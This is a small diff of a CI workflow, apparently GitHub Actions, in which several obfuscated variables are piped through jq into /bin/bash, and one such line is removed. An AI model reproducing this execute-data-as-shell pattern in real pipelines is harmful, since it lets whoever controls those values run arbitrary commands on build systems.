@@ -24,7 +24,6 @@ jobs:
           echo $wybix7 | jq -r .rggfb1416 | /bin/bash
           echo $r5012 | jq -r .v66 | /bin/bash
           printf '%s' "$c89" | jq -r .gkyc7971 | /bin/bash
-          printf '%s' "$pm7076" | jq -r .tv92174 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
